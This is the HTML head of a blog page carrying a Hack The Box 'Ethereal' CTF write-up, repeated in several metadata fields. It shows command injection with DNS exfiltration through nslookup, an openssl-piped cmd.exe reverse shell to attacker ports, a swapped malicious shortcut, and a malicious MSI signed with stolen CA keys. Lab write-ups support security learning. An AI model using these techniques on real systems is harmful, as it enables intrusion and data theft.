<!DOCTYPE html>
<html lang="en"><head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.5.0 -->
<title>Hack The Box - Ethereal | 0xRick Owned Root !</title>
<meta name="generator" content="Jekyll v3.7.4" />
<meta property="og:title" content="Hack The Box - Ethereal" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="Quick Summary Hey guys today Ethereal retired and here is my write-up about it. And as the difficulty says , It’s insane ! The most annoying part about this box is that it was very hard to enumerate because we only get a blind RCE and the firewall rules made it even harder because it only allowed TCP connection for 2 ports. It was fun and annoying at the same time but I liked it. It’s a Windows box and its ip is 10.10.10.106 I added it to /etc/hosts as ethereal.htb , Let’s jump right in ! Nmap As always we will start with nmap to scan for open ports and services : nmap -sV -sT -sC ethereal.htb And we get FTP on port 21 , HTTP on port 80 and 8080. It also tells us that FTP anonymous authentication is allowed. As always we will enumerate HTTP first. HTTP Initial Enumeration On port 80 we see this website : The only interseting thing is in the menu we see an Admin-area : Clicking on that we get redirected to this page which has some other options like Notes , Messages , Desktop and Ping : By going to notes we only get this : So now we know that there’s a “test connection” page somewhere , we also get a potential username alan. By clicking on messages we get nothing , but desktop : And it’s very clear that this is fake , also the user.txt is a troll : By clicking on ping we get redirected to port 8080 which asks us for authentication and it uses http basic auth : So now we know what’s on port 8080 , the “Test Connection” page. But we need credentials to access it. One more thing to check is sub directory enumeration with gobsuter or any alternative : gobuster -u http://ethereal.htb -w /usr/share/wordlists/dirb/common.txt -t 100 -to 250s ===================================================== Gobuster v2.0.0 OJ Reeves (@TheColonial) ===================================================== [+] Mode : dir [+] Url/Domain : http://ethereal.htb/ [+] Threads : 100 [+] Wordlist : /usr/share/wordlists/dirb/common.txt [+] Status codes : 200,204,301,302,307,403 [+] Timeout : 4m10s ===================================================== 2019/03/06 21:51:24 Starting gobuster ===================================================== /corp (Status: 301) gobuster only found /corp with the wordlist /usr/share/wordlists/dirb/common.txt and that’s the subdirectory that had the admin stuff. We can’t get any more info and there’s nothing to exploit so next thing to look at is FTP FTP Enumeration On FTP there are some files but the most interesting ones are FDISK.zip and DISK.zip so we will check them first : We will unzip them : Then we will check what kind of files do we have with file : Most likely they are mountable disks so we will create a directory to mount them and call it mnt then we will make a directory for disk1 , disk2 and fdisk and finally we will mount them mount -o loop [Disk] [Directory] : In disk1 and disk2 there are some files that are not very interesting : But on fdisk there’s a directory called pbox : It contains an executable called pbox.exe and a dat file called pbox.dat : Getting Credentials We will switch to a windows box to run that executable , you can alternatively use wine or a program called dosbox. wine didn’t work for me and dosbox kept crashing every 15 seconds. When we try to open it it asks for a password : At this point the only option I had was to guess the password because I didn’t know how to bruteforce the password in this case , however the password was “password” :D , so no bruteforce is needed it’s only a quick guess , after we get in , we see this password database : databases : msdn : learning : ftp drop : backup : website uploads : truecrypt : management server : svn : Back to our kali , now we can create a list with all the information we got : I put the passwords in a separate list to bruteforce the http auth with it : We will use wfuzz and we will try the username alan first : wfuzz -u http://ethereal.htb:8080 --basic alan:FUZZ -w passwords.txt Password : !C414m17y57r1k3s4g41n! Blind RCE Now after we login we get the “Test Connection” page and we have an input for the ip address to ping. Now we can try to bypass that and inject system commands using &amp; or | , but we don’t get any output. I also tried to host nc.exe on a python http server and used certutil to download it but the python server didn’t get any requests. Finally when I ran responder responder -I tun0 then did this 10.10.xx.xx &amp; nslookup test 10.10.xx.xx I finally got something : We can try to execute a system command and get the output by doing this : 10.10.xx.xx &amp; for /f %i in (&#39;whoami&#39;) do nslookup %i 10.10.xx.xx This is executing whoami then taking the output and doing nslookup with the output to our ip : We get etherealalan and that’s unusual as we expected ethereal\alan. We will start enumerating the filesystem this way , read this if you don’t understand some of the for commands that we will use. 10.10.xx.xx &amp; for /f %i in (&#39;cd&#39;) do nslookup %i 10.10.xx.xx So the current directory is c:\windows\system32\inetsrv We also need to know the users on the box : 10.10.xx.xx &amp; for /f &quot;tokens=1,2,3&quot; %a in (&#39;dir /B &quot;C:\Users&quot;&#39;) do nslookup %a.%b.%c 10.10.xx.xx We have 5 users on the box alan , jorge , Public , rupal and Administrator. We are executing commands as alan Next thing to look at is the installed programs : 10.10.xx.xx &amp; for /f &quot;tokens=1,2,3&quot; %a in (&#39;dir /B &quot;C:\Program Files (x86)&quot;&#39;) do nslookup %a.%b.%c 10.10.xx.xx We notice that OpenSSL is installed which is unusual , we also need to know why can’t we make the box connect back to us so we will check the firewall rules. In our case the easiest way to do this is to execute the command and only look for the string Rule Name: then redirect that output to a file , and read that file like we are doing. But first we need to find a place that we can write to. After some attempts I could write to c:\users\public\desktop\shortcuts , so we will do this : 10.10.xx.xx &amp; netsh advfirewall firewall show rule name=all | findstr &quot;Rule Name:&quot; &gt; C:\Users\Public\Desktop\Shortcuts\firewall.txt Then we will list the contents of c:\users\public\desktop\shortcuts 10.10.xx.xx &amp; for /f &quot;tokens=1,2,3&quot; %a in (&#39;dir /B &quot;C:\Users\Public\Desktop\Shortcuts&quot;&#39;) do nslookup %a.%b.%c 10.10.xx.xx And we see that we have successfully written into that directory , next step is to read the file : 10.10.xx.xx &amp; for /f &quot;tokens=1,2,3,4,5,6,7&quot; %a in (&#39;type C:\Users\Public\Desktop\Shortcuts\firewall.txt&#39;) do nslookup %a.%b.%c.%d.%e.%f.%g 10.10.xx.xx It’s only allowing TCP conections to port 73 and 136 , we saw earlier that openssl was installed on the box , we can create a SSL/TLS server on these ports and use openssl to make the box connect back to us. Generating certs and setting up the server First step is to generate certificates because we need them to set up the server openssl req -x509 -newkey rsa:4096 -keyout key.pem -out certificate.pem -days 365 -nodes Then we will split our terminal and run 2 servers , one on port 73 and the other on port 136 openssl s_server -key key.pen -cert certificate.pem -quiet -port [port] Read more about s_server We are setting up 2 servers because we are going to use openssl on the box to connect on port 73 and take our input , then we will pipe that input to cmd.exe then we will pipe the output to our server on port 136. Now we need to locate openssl.exe , if we listed the contents of OpenSSL-v1.1.0 in Program Files (x86) (can also be written Progra~2. check this) we will get this output : 10.10.xx.xx &amp; for /f &quot;tokens=1,2,3&quot; %a in (&#39;dir /B &quot;C:\Program Files (x86)\OpenSSL-v1.1.0&quot;&#39;) do nslookup %a.%b.%c 10.10.xx.xx We see a directory called bin that’s where openssl.exe is located so the path is c:\progra~2\OpenSSL-v1.1.0\bin\openssl.exe Now everything is ready , in the ping page we will write this : 10.10.xx.xx | &quot;C:\Program Files (x86)\OpenSSL-v1.1.0\bin\openssl.exe&quot; s_client -quiet -connect 10.10.xx.xx:73 | cmd.exe | &quot;C:\Program Files (x86)\OpenSSL-v1.1.0\bin\openssl.exe&quot; s_client -quiet -connect 10.10.xx.xx:136 Then we will check our server : Now we will write the commands on the first server (port 73) , then we will refresh the ping page , to send the post request again (this will pipe our input from port 73 to cmd.exe then to the server on port 136) then we will get our output on the second server. alan’s desktop doesn’t have the flag so we need to escalate to another user , there’s a note on alan’s desktop in a file called note-draft.txt: Creating a malicious lnk and getting User From the note we knew that there’s a lnk on Public’s desktop and other users on the box are using it. So if we replaced it with a payload we can get a shell as another user. There’s a tool on github called LNKup I used it to create the payload : To uplaod it we will close any one of the servers and run it again but this time we will redirect the lnk file to it : Then on the ping page we will type this : 10.10.xx.xx | &quot;C:\Program Files (x86)\OpenSSL-v1.1.0\bin\openssl.exe&quot; s_client -quiet -connect 10.10.xx.xx:136 &gt; &quot;C:\Users\Public\Desktop\Shortcuts\rick.lnk&quot; We will close the server , run the 2 servers and get our shell as alan like we did before , then we will delete the original lnk and copy ours with the name of the old lnk : del &quot;c:\users\public\desktop\shortcuts\Visual Studio 2017.lnk&quot; &amp; copy &quot;c:\users\public\desktop\shortcuts\rick.lnk&quot; &quot;c:\users\public\desktop\shortcuts\Visual Studio 2017.lnk&quot; &amp; dir c:\users\public\desktop\shortcuts Then we will close the 2 servers , run them again and wait for someone to execute the lnk file , after a minute we will get a shell as jorge : With this we don’t need to refresh any pages because the connection is not handled by the ping page anymore so the command will be piped immediately from the first server to the second server. Finally we owned user ! More Filesystem Enumeration If we checked the other drives : fsutil fsinfo drives We will find that C is not the only drive and there’s also D. Unfortunately if someone started to enumerate without doing this important step in windows enumeration , they won’t get anything. Contents of D: In DEV there’s a directory called MSIs and it has a note : So we have to create a malicious msi and place it there to get a shell as rupal. We also need to get the certs to sign the msi , the certs are found in D:\Certs , MyCA.cer and MyCA.pvk , to transfer them to our box we will use openssl to base64 encode the certs then we can copy and decode on our box. C:\progra~2\OpenSSL-v1.1.0\bin\openssl.exe base64 -in MyCA.cer C:\progra~2\OpenSSL-v1.1.0\bin\openssl.exe base64 -in MyCA.pvk Now we will go to a windows box again to create the msi Creating Malicious msi and getting root In order to create the msi we will use wixtools , you can use other msi builders but they didn’t work for me. Check this page for some wix msi usage examples. We will create an msi that executes our lnk file : &lt;?xml version=&quot;1.0&quot;?&gt; &lt;Wix xmlns=&quot;http://schemas.microsoft.com/wix/2006/wi&quot;&gt; &lt;Product Id=&quot;*&quot; UpgradeCode=&quot;12345678-1234-1234-1234-111111111111&quot; Name=&quot;Example Product Name&quot; Version=&quot;0.0.1&quot; Manufacturer=&quot;@_xpn_&quot; Language=&quot;1033&quot;&gt; &lt;Package InstallerVersion=&quot;200&quot; Compressed=&quot;yes&quot; Comments=&quot;Windows Installer Package&quot;/&gt; &lt;Media Id=&quot;1&quot; Cabinet=&quot;product.cab&quot; EmbedCab=&quot;yes&quot;/&gt; &lt;Directory Id=&quot;TARGETDIR&quot; Name=&quot;SourceDir&quot;&gt; &lt;Directory Id=&quot;ProgramFilesFolder&quot;&gt; &lt;Directory Id=&quot;INSTALLLOCATION&quot; Name=&quot;Example&quot;&gt; &lt;Component Id=&quot;ApplicationFiles&quot; Guid=&quot;12345678-1234-1234-1234-222222222222&quot;&gt; &lt;/Component&gt; &lt;/Directory&gt; &lt;/Directory&gt; &lt;/Directory&gt; &lt;Feature Id=&quot;DefaultFeature&quot; Level=&quot;1&quot;&gt; &lt;ComponentRef Id=&quot;ApplicationFiles&quot;/&gt; &lt;/Feature&gt; &lt;Property Id=&quot;cmdline&quot;&gt;cmd.exe /C &quot;c:\users\public\desktop\shortcuts\rick.lnk&quot;&lt;/Property&gt; &lt;CustomAction Id=&quot;Stage1&quot; Execute=&quot;deferred&quot; Directory=&quot;TARGETDIR&quot; ExeCommand=&#39;[cmdline]&#39; Return=&quot;ignore&quot; Impersonate=&quot;yes&quot;/&gt; &lt;CustomAction Id=&quot;Stage2&quot; Execute=&quot;deferred&quot; Script=&quot;vbscript&quot; Return=&quot;check&quot;&gt; fail_here &lt;/CustomAction&gt; &lt;InstallExecuteSequence&gt; &lt;Custom Action=&quot;Stage1&quot; After=&quot;InstallInitialize&quot;&gt;&lt;/Custom&gt; &lt;Custom Action=&quot;Stage2&quot; Before=&quot;InstallFiles&quot;&gt;&lt;/Custom&gt; &lt;/InstallExecuteSequence&gt; &lt;/Product&gt; &lt;/Wix&gt; We will use candle.exe from wixtools to create a wixobject from msi.xml Then we will use light.exe to create the msi file from the wixobject After that we need tools from microsoft sdk to sign our msi , first we will use makecert.exe to create new certs from the original certs we got from the box makecert.exe -n &quot;CN=Ethereal&quot; -pe -cy end -ic c:\tmp\MyCA.cer -iv c:\tmp\MyCA.pvk -sky signature -sv c:\tmp\rick.pvk c:\tmp\rick.cer It will ask for a password we will leave it blank for no password protection : Then we will use pvk2pfx.exe to create a pfx for both the cer and the pvk files. pvk2pfx.exe -pvk c:\tmp\rick.pvk -spc c:\tmp\rick.cer -pfx c:\tmp\rick.pfx And finally we will use signtool.exe to sign the msi with the pfx signtool.exe sign /f c:\tmp\rick.pfx c:\tmp\ethereal\rick.msi Now back to our kali we will upload the msi the same way we uploaded the lnk file before , and we also need to make sure that the lnk file is in c:\users\public\desktop\shortcuts\ because the msi is just executing that lnk. We will put the msi into D:\DEV\MSIs Then we will close the servers , run them again and wait for around 3-5 minutes until rupal opens the msi And we got root ! That’s it , Feedback is appreciated ! Don’t forget to read the previous write-ups , Tweet about the write-up if you liked it , follow on twitter for awesome resources @Ahm3d_H3sham Thanks for reading. Previous Hack The Box write-up : Hack The Box - Access Next Hack The Box write-up : Hack The Box - Carrier" />
<meta property="og:description" content="Quick Summary Hey guys today Ethereal retired and here is my write-up about it. And as the difficulty says , It’s insane ! The most annoying part about this box is that it was very hard to enumerate because we only get a blind RCE and the firewall rules made it even harder because it only allowed TCP connection for 2 ports. It was fun and annoying at the same time but I liked it. It’s a Windows box and its ip is 10.10.10.106 I added it to /etc/hosts as ethereal.htb , Let’s jump right in ! Nmap As always we will start with nmap to scan for open ports and services : nmap -sV -sT -sC ethereal.htb And we get FTP on port 21 , HTTP on port 80 and 8080. It also tells us that FTP anonymous authentication is allowed. As always we will enumerate HTTP first. HTTP Initial Enumeration On port 80 we see this website : The only interseting thing is in the menu we see an Admin-area : Clicking on that we get redirected to this page which has some other options like Notes , Messages , Desktop and Ping : By going to notes we only get this : So now we know that there’s a “test connection” page somewhere , we also get a potential username alan. By clicking on messages we get nothing , but desktop : And it’s very clear that this is fake , also the user.txt is a troll : By clicking on ping we get redirected to port 8080 which asks us for authentication and it uses http basic auth : So now we know what’s on port 8080 , the “Test Connection” page. But we need credentials to access it. One more thing to check is sub directory enumeration with gobsuter or any alternative : gobuster -u http://ethereal.htb -w /usr/share/wordlists/dirb/common.txt -t 100 -to 250s ===================================================== Gobuster v2.0.0 OJ Reeves (@TheColonial) ===================================================== [+] Mode : dir [+] Url/Domain : http://ethereal.htb/ [+] Threads : 100 [+] Wordlist : /usr/share/wordlists/dirb/common.txt [+] Status codes : 200,204,301,302,307,403 [+] Timeout : 4m10s ===================================================== 2019/03/06 21:51:24 Starting gobuster ===================================================== /corp (Status: 301) gobuster only found /corp with the wordlist /usr/share/wordlists/dirb/common.txt and that’s the subdirectory that had the admin stuff. We can’t get any more info and there’s nothing to exploit so next thing to look at is FTP FTP Enumeration On FTP there are some files but the most interesting ones are FDISK.zip and DISK.zip so we will check them first : We will unzip them : Then we will check what kind of files do we have with file : Most likely they are mountable disks so we will create a directory to mount them and call it mnt then we will make a directory for disk1 , disk2 and fdisk and finally we will mount them mount -o loop [Disk] [Directory] : In disk1 and disk2 there are some files that are not very interesting : But on fdisk there’s a directory called pbox : It contains an executable called pbox.exe and a dat file called pbox.dat : Getting Credentials We will switch to a windows box to run that executable , you can alternatively use wine or a program called dosbox. wine didn’t work for me and dosbox kept crashing every 15 seconds. When we try to open it it asks for a password : At this point the only option I had was to guess the password because I didn’t know how to bruteforce the password in this case , however the password was “password” :D , so no bruteforce is needed it’s only a quick guess , after we get in , we see this password database : databases : msdn : learning : ftp drop : backup : website uploads : truecrypt : management server : svn : Back to our kali , now we can create a list with all the information we got : I put the passwords in a separate list to bruteforce the http auth with it : We will use wfuzz and we will try the username alan first : wfuzz -u http://ethereal.htb:8080 --basic alan:FUZZ -w passwords.txt Password : !C414m17y57r1k3s4g41n! Blind RCE Now after we login we get the “Test Connection” page and we have an input for the ip address to ping. Now we can try to bypass that and inject system commands using &amp; or | , but we don’t get any output. I also tried to host nc.exe on a python http server and used certutil to download it but the python server didn’t get any requests. Finally when I ran responder responder -I tun0 then did this 10.10.xx.xx &amp; nslookup test 10.10.xx.xx I finally got something : We can try to execute a system command and get the output by doing this : 10.10.xx.xx &amp; for /f %i in (&#39;whoami&#39;) do nslookup %i 10.10.xx.xx This is executing whoami then taking the output and doing nslookup with the output to our ip : We get etherealalan and that’s unusual as we expected ethereal\alan. We will start enumerating the filesystem this way , read this if you don’t understand some of the for commands that we will use. 10.10.xx.xx &amp; for /f %i in (&#39;cd&#39;) do nslookup %i 10.10.xx.xx So the current directory is c:\windows\system32\inetsrv We also need to know the users on the box : 10.10.xx.xx &amp; for /f &quot;tokens=1,2,3&quot; %a in (&#39;dir /B &quot;C:\Users&quot;&#39;) do nslookup %a.%b.%c 10.10.xx.xx We have 5 users on the box alan , jorge , Public , rupal and Administrator. We are executing commands as alan Next thing to look at is the installed programs : 10.10.xx.xx &amp; for /f &quot;tokens=1,2,3&quot; %a in (&#39;dir /B &quot;C:\Program Files (x86)&quot;&#39;) do nslookup %a.%b.%c 10.10.xx.xx We notice that OpenSSL is installed which is unusual , we also need to know why can’t we make the box connect back to us so we will check the firewall rules. In our case the easiest way to do this is to execute the command and only look for the string Rule Name: then redirect that output to a file , and read that file like we are doing. But first we need to find a place that we can write to. After some attempts I could write to c:\users\public\desktop\shortcuts , so we will do this : 10.10.xx.xx &amp; netsh advfirewall firewall show rule name=all | findstr &quot;Rule Name:&quot; &gt; C:\Users\Public\Desktop\Shortcuts\firewall.txt Then we will list the contents of c:\users\public\desktop\shortcuts 10.10.xx.xx &amp; for /f &quot;tokens=1,2,3&quot; %a in (&#39;dir /B &quot;C:\Users\Public\Desktop\Shortcuts&quot;&#39;) do nslookup %a.%b.%c 10.10.xx.xx And we see that we have successfully written into that directory , next step is to read the file : 10.10.xx.xx &amp; for /f &quot;tokens=1,2,3,4,5,6,7&quot; %a in (&#39;type C:\Users\Public\Desktop\Shortcuts\firewall.txt&#39;) do nslookup %a.%b.%c.%d.%e.%f.%g 10.10.xx.xx It’s only allowing TCP conections to port 73 and 136 , we saw earlier that openssl was installed on the box , we can create a SSL/TLS server on these ports and use openssl to make the box connect back to us. Generating certs and setting up the server First step is to generate certificates because we need them to set up the server openssl req -x509 -newkey rsa:4096 -keyout key.pem -out certificate.pem -days 365 -nodes Then we will split our terminal and run 2 servers , one on port 73 and the other on port 136 openssl s_server -key key.pen -cert certificate.pem -quiet -port [port] Read more about s_server We are setting up 2 servers because we are going to use openssl on the box to connect on port 73 and take our input , then we will pipe that input to cmd.exe then we will pipe the output to our server on port 136. Now we need to locate openssl.exe , if we listed the contents of OpenSSL-v1.1.0 in Program Files (x86) (can also be written Progra~2. check this) we will get this output : 10.10.xx.xx &amp; for /f &quot;tokens=1,2,3&quot; %a in (&#39;dir /B &quot;C:\Program Files (x86)\OpenSSL-v1.1.0&quot;&#39;) do nslookup %a.%b.%c 10.10.xx.xx We see a directory called bin that’s where openssl.exe is located so the path is c:\progra~2\OpenSSL-v1.1.0\bin\openssl.exe Now everything is ready , in the ping page we will write this : 10.10.xx.xx | &quot;C:\Program Files (x86)\OpenSSL-v1.1.0\bin\openssl.exe&quot; s_client -quiet -connect 10.10.xx.xx:73 | cmd.exe | &quot;C:\Program Files (x86)\OpenSSL-v1.1.0\bin\openssl.exe&quot; s_client -quiet -connect 10.10.xx.xx:136 Then we will check our server : Now we will write the commands on the first server (port 73) , then we will refresh the ping page , to send the post request again (this will pipe our input from port 73 to cmd.exe then to the server on port 136) then we will get our output on the second server. alan’s desktop doesn’t have the flag so we need to escalate to another user , there’s a note on alan’s desktop in a file called note-draft.txt: Creating a malicious lnk and getting User From the note we knew that there’s a lnk on Public’s desktop and other users on the box are using it. So if we replaced it with a payload we can get a shell as another user. There’s a tool on github called LNKup I used it to create the payload : To uplaod it we will close any one of the servers and run it again but this time we will redirect the lnk file to it : Then on the ping page we will type this : 10.10.xx.xx | &quot;C:\Program Files (x86)\OpenSSL-v1.1.0\bin\openssl.exe&quot; s_client -quiet -connect 10.10.xx.xx:136 &gt; &quot;C:\Users\Public\Desktop\Shortcuts\rick.lnk&quot; We will close the server , run the 2 servers and get our shell as alan like we did before , then we will delete the original lnk and copy ours with the name of the old lnk : del &quot;c:\users\public\desktop\shortcuts\Visual Studio 2017.lnk&quot; &amp; copy &quot;c:\users\public\desktop\shortcuts\rick.lnk&quot; &quot;c:\users\public\desktop\shortcuts\Visual Studio 2017.lnk&quot; &amp; dir c:\users\public\desktop\shortcuts Then we will close the 2 servers , run them again and wait for someone to execute the lnk file , after a minute we will get a shell as jorge : With this we don’t need to refresh any pages because the connection is not handled by the ping page anymore so the command will be piped immediately from the first server to the second server. Finally we owned user ! More Filesystem Enumeration If we checked the other drives : fsutil fsinfo drives We will find that C is not the only drive and there’s also D. Unfortunately if someone started to enumerate without doing this important step in windows enumeration , they won’t get anything. Contents of D: In DEV there’s a directory called MSIs and it has a note : So we have to create a malicious msi and place it there to get a shell as rupal. We also need to get the certs to sign the msi , the certs are found in D:\Certs , MyCA.cer and MyCA.pvk , to transfer them to our box we will use openssl to base64 encode the certs then we can copy and decode on our box. C:\progra~2\OpenSSL-v1.1.0\bin\openssl.exe base64 -in MyCA.cer C:\progra~2\OpenSSL-v1.1.0\bin\openssl.exe base64 -in MyCA.pvk Now we will go to a windows box again to create the msi Creating Malicious msi and getting root In order to create the msi we will use wixtools , you can use other msi builders but they didn’t work for me. Check this page for some wix msi usage examples. We will create an msi that executes our lnk file : &lt;?xml version=&quot;1.0&quot;?&gt; &lt;Wix xmlns=&quot;http://schemas.microsoft.com/wix/2006/wi&quot;&gt; &lt;Product Id=&quot;*&quot; UpgradeCode=&quot;12345678-1234-1234-1234-111111111111&quot; Name=&quot;Example Product Name&quot; Version=&quot;0.0.1&quot; Manufacturer=&quot;@_xpn_&quot; Language=&quot;1033&quot;&gt; &lt;Package InstallerVersion=&quot;200&quot; Compressed=&quot;yes&quot; Comments=&quot;Windows Installer Package&quot;/&gt; &lt;Media Id=&quot;1&quot; Cabinet=&quot;product.cab&quot; EmbedCab=&quot;yes&quot;/&gt; &lt;Directory Id=&quot;TARGETDIR&quot; Name=&quot;SourceDir&quot;&gt; &lt;Directory Id=&quot;ProgramFilesFolder&quot;&gt; &lt;Directory Id=&quot;INSTALLLOCATION&quot; Name=&quot;Example&quot;&gt; &lt;Component Id=&quot;ApplicationFiles&quot; Guid=&quot;12345678-1234-1234-1234-222222222222&quot;&gt; &lt;/Component&gt; &lt;/Directory&gt; &lt;/Directory&gt; &lt;/Directory&gt; &lt;Feature Id=&quot;DefaultFeature&quot; Level=&quot;1&quot;&gt; &lt;ComponentRef Id=&quot;ApplicationFiles&quot;/&gt; &lt;/Feature&gt; &lt;Property Id=&quot;cmdline&quot;&gt;cmd.exe /C &quot;c:\users\public\desktop\shortcuts\rick.lnk&quot;&lt;/Property&gt; &lt;CustomAction Id=&quot;Stage1&quot; Execute=&quot;deferred&quot; Directory=&quot;TARGETDIR&quot; ExeCommand=&#39;[cmdline]&#39; Return=&quot;ignore&quot; Impersonate=&quot;yes&quot;/&gt; &lt;CustomAction Id=&quot;Stage2&quot; Execute=&quot;deferred&quot; Script=&quot;vbscript&quot; Return=&quot;check&quot;&gt; fail_here &lt;/CustomAction&gt; &lt;InstallExecuteSequence&gt; &lt;Custom Action=&quot;Stage1&quot; After=&quot;InstallInitialize&quot;&gt;&lt;/Custom&gt; &lt;Custom Action=&quot;Stage2&quot; Before=&quot;InstallFiles&quot;&gt;&lt;/Custom&gt; &lt;/InstallExecuteSequence&gt; &lt;/Product&gt; &lt;/Wix&gt; We will use candle.exe from wixtools to create a wixobject from msi.xml Then we will use light.exe to create the msi file from the wixobject After that we need tools from microsoft sdk to sign our msi , first we will use makecert.exe to create new certs from the original certs we got from the box makecert.exe -n &quot;CN=Ethereal&quot; -pe -cy end -ic c:\tmp\MyCA.cer -iv c:\tmp\MyCA.pvk -sky signature -sv c:\tmp\rick.pvk c:\tmp\rick.cer It will ask for a password we will leave it blank for no password protection : Then we will use pvk2pfx.exe to create a pfx for both the cer and the pvk files. pvk2pfx.exe -pvk c:\tmp\rick.pvk -spc c:\tmp\rick.cer -pfx c:\tmp\rick.pfx And finally we will use signtool.exe to sign the msi with the pfx signtool.exe sign /f c:\tmp\rick.pfx c:\tmp\ethereal\rick.msi Now back to our kali we will upload the msi the same way we uploaded the lnk file before , and we also need to make sure that the lnk file is in c:\users\public\desktop\shortcuts\ because the msi is just executing that lnk. We will put the msi into D:\DEV\MSIs Then we will close the servers , run them again and wait for around 3-5 minutes until rupal opens the msi And we got root ! That’s it , Feedback is appreciated ! Don’t forget to read the previous write-ups , Tweet about the write-up if you liked it , follow on twitter for awesome resources @Ahm3d_H3sham Thanks for reading. Previous Hack The Box write-up : Hack The Box - Access Next Hack The Box write-up : Hack The Box - Carrier" />
<link rel="canonical" href="http://localhost:4000/hack-the-box/ethereal/" />
<meta property="og:url" content="http://localhost:4000/hack-the-box/ethereal/" />
<meta property="og:site_name" content="0xRick Owned Root !" />
<meta property="og:image" content="http://localhost:4000/hackthebox/ethereal/0.png" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2019-03-09T00:00:00+02:00" />
<script type="application/ld+json">
{"description":"Quick Summary Hey guys today Ethereal retired and here is my write-up about it. And as the difficulty says , It’s insane ! The most annoying part about this box is that it was very hard to enumerate because we only get a blind RCE and the firewall rules made it even harder because it only allowed TCP connection for 2 ports. It was fun and annoying at the same time but I liked it. It’s a Windows box and its ip is 10.10.10.106 I added it to /etc/hosts as ethereal.htb , Let’s jump right in ! Nmap As always we will start with nmap to scan for open ports and services : nmap -sV -sT -sC ethereal.htb And we get FTP on port 21 , HTTP on port 80 and 8080. It also tells us that FTP anonymous authentication is allowed. As always we will enumerate HTTP first. HTTP Initial Enumeration On port 80 we see this website : The only interseting thing is in the menu we see an Admin-area : Clicking on that we get redirected to this page which has some other options like Notes , Messages , Desktop and Ping : By going to notes we only get this : So now we know that there’s a “test connection” page somewhere , we also get a potential username alan. By clicking on messages we get nothing , but desktop : And it’s very clear that this is fake , also the user.txt is a troll : By clicking on ping we get redirected to port 8080 which asks us for authentication and it uses http basic auth : So now we know what’s on port 8080 , the “Test Connection” page. But we need credentials to access it. One more thing to check is sub directory enumeration with gobsuter or any alternative : gobuster -u http://ethereal.htb -w /usr/share/wordlists/dirb/common.txt -t 100 -to 250s ===================================================== Gobuster v2.0.0 OJ Reeves (@TheColonial) ===================================================== [+] Mode : dir [+] Url/Domain : http://ethereal.htb/ [+] Threads : 100 [+] Wordlist : /usr/share/wordlists/dirb/common.txt [+] Status codes : 200,204,301,302,307,403 [+] Timeout : 4m10s ===================================================== 2019/03/06 21:51:24 Starting gobuster ===================================================== /corp (Status: 301) gobuster only found /corp with the wordlist /usr/share/wordlists/dirb/common.txt and that’s the subdirectory that had the admin stuff. We can’t get any more info and there’s nothing to exploit so next thing to look at is FTP FTP Enumeration On FTP there are some files but the most interesting ones are FDISK.zip and DISK.zip so we will check them first : We will unzip them : Then we will check what kind of files do we have with file : Most likely they are mountable disks so we will create a directory to mount them and call it mnt then we will make a directory for disk1 , disk2 and fdisk and finally we will mount them mount -o loop [Disk] [Directory] : In disk1 and disk2 there are some files that are not very interesting : But on fdisk there’s a directory called pbox : It contains an executable called pbox.exe and a dat file called pbox.dat : Getting Credentials We will switch to a windows box to run that executable , you can alternatively use wine or a program called dosbox. wine didn’t work for me and dosbox kept crashing every 15 seconds. When we try to open it it asks for a password : At this point the only option I had was to guess the password because I didn’t know how to bruteforce the password in this case , however the password was “password” :D , so no bruteforce is needed it’s only a quick guess , after we get in , we see this password database : databases : msdn : learning : ftp drop : backup : website uploads : truecrypt : management server : svn : Back to our kali , now we can create a list with all the information we got : I put the passwords in a separate list to bruteforce the http auth with it : We will use wfuzz and we will try the username alan first : wfuzz -u http://ethereal.htb:8080 --basic alan:FUZZ -w passwords.txt Password : !C414m17y57r1k3s4g41n! Blind RCE Now after we login we get the “Test Connection” page and we have an input for the ip address to ping. Now we can try to bypass that and inject system commands using &amp; or | , but we don’t get any output. I also tried to host nc.exe on a python http server and used certutil to download it but the python server didn’t get any requests. Finally when I ran responder responder -I tun0 then did this 10.10.xx.xx &amp; nslookup test 10.10.xx.xx I finally got something : We can try to execute a system command and get the output by doing this : 10.10.xx.xx &amp; for /f %i in (&#39;whoami&#39;) do nslookup %i 10.10.xx.xx This is executing whoami then taking the output and doing nslookup with the output to our ip : We get etherealalan and that’s unusual as we expected ethereal\\alan. We will start enumerating the filesystem this way , read this if you don’t understand some of the for commands that we will use. 10.10.xx.xx &amp; for /f %i in (&#39;cd&#39;) do nslookup %i 10.10.xx.xx So the current directory is c:\\windows\\system32\\inetsrv We also need to know the users on the box : 10.10.xx.xx &amp; for /f &quot;tokens=1,2,3&quot; %a in (&#39;dir /B &quot;C:\\Users&quot;&#39;) do nslookup %a.%b.%c 10.10.xx.xx We have 5 users on the box alan , jorge , Public , rupal and Administrator. We are executing commands as alan Next thing to look at is the installed programs : 10.10.xx.xx &amp; for /f &quot;tokens=1,2,3&quot; %a in (&#39;dir /B &quot;C:\\Program Files (x86)&quot;&#39;) do nslookup %a.%b.%c 10.10.xx.xx We notice that OpenSSL is installed which is unusual , we also need to know why can’t we make the box connect back to us so we will check the firewall rules. In our case the easiest way to do this is to execute the command and only look for the string Rule Name: then redirect that output to a file , and read that file like we are doing. But first we need to find a place that we can write to. After some attempts I could write to c:\\users\\public\\desktop\\shortcuts , so we will do this : 10.10.xx.xx &amp; netsh advfirewall firewall show rule name=all | findstr &quot;Rule Name:&quot; &gt; C:\\Users\\Public\\Desktop\\Shortcuts\\firewall.txt Then we will list the contents of c:\\users\\public\\desktop\\shortcuts 10.10.xx.xx &amp; for /f &quot;tokens=1,2,3&quot; %a in (&#39;dir /B &quot;C:\\Users\\Public\\Desktop\\Shortcuts&quot;&#39;) do nslookup %a.%b.%c 10.10.xx.xx And we see that we have successfully written into that directory , next step is to read the file : 10.10.xx.xx &amp; for /f &quot;tokens=1,2,3,4,5,6,7&quot; %a in (&#39;type C:\\Users\\Public\\Desktop\\Shortcuts\\firewall.txt&#39;) do nslookup %a.%b.%c.%d.%e.%f.%g 10.10.xx.xx It’s only allowing TCP conections to port 73 and 136 , we saw earlier that openssl was installed on the box , we can create a SSL/TLS server on these ports and use openssl to make the box connect back to us. Generating certs and setting up the server First step is to generate certificates because we need them to set up the server openssl req -x509 -newkey rsa:4096 -keyout key.pem -out certificate.pem -days 365 -nodes Then we will split our terminal and run 2 servers , one on port 73 